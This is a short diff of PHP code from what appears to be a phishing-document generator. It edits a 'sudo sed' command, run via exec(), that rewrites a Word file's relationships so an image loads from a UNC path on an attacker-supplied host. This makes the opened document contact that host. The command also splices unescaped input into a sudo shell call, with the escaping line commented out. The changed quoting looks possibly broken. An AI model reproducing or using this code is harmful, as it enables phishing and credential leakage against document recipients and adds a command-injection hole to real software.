@@ -494,7 +494,7 @@ exec($cmd4,$output4);
 //var_dump($output4);
 //echo $cmd4;
 
-$cmd5 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+    $cmd5 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\ "TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
 //$cmd5 = escapeshellcmd($cmd5);
 exec($cmd5,$output5);
 
